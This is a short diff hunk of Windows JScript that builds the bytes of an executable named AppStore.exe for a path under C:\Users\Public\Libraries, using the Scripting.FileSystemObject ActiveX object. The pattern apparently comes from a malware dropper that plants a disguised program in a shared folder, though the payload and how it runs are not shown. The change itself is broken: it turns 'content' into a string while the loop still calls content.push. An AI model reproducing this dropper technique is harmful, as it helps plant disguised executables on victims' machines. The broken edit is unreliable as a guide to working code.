@@ -4,7 +4,7 @@ try {
   var path = "C:\\Users\\Public\\Libraries\\AppStore.exe"
   var fso = new ActiveXObject("Scripting.FileSystemObject")
 
-  var content = []
+  var content = ''
   for (var i = 0; i < data.length; i++) {
     content.push(String.fromCharCode(data[i]))
   }
